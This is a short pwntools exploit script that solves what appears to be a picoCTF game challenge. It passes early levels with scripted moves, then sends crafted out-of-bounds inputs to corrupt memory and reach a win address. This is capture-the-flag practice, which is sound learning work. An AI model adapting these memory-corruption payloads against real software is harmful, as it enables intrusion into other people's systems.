from pwn import *

WIN_ADDR = 0x80497bc
TRIGGER = 0x08049970
NEXT_TRIGGER = 0x080499c7
JUMP_LOCATION = (0xff9fa7e6, 0, 39)
NEXT_JUMP_LOCATION = (0xffbfb3c6, 0, 23)
_ = (0,7)

LNG_JUMP_START = 0xffa9e919
LNG_JUMP_END = 0xffa9e8bf
RES = -90

# p = process('./game')
p = remote('rhea.picoctf.net', 58049)
# p = gdb.debug('./game', '''
#     break main
#     break move_player
#     # display/xw $ebp-0xaa8
#     # display/xw $ebp-0xaa4
#     # display/xw $ebp-0xaac
#     # display/xw $ebp-0xc
#     # display/xw $esp+0x4
#     # display/xw 0xffa9e8b0
#     # display/xw 0xffa9e8b4
#     # display/xw 0xffa9e8ac
#     # display/xw 0xffa9f34c
#     # display/30xg 0xffa9e8bc
#     continue
# ''')

def passEasy():
    p.sendline(b'wwwww')
    p.sendline(b'aaaaa')
    p.sendline(b's')
    p.sendline(b'aaa')
    p.sendline(b's')
    p.sendline(b'p')

# p.sendline(b'l\xc7')

passEasy()
passEasy()
passEasy()
passEasy()

payload = ('w' * 29) + ('a' * 50) + ('lp') + ('w')
p.sendline(payload.encode())

p.sendline(b'wwwww')
p.sendline(b'aaaaa')
p.sendline(b's')
p.sendline(b'aaa')
p.sendline(b's')
payload = ('a' * 63)
p.sendline(payload.encode())
# p.sendline(payload.encode())
p.sendline(b'l\xfew')

p.interactive()
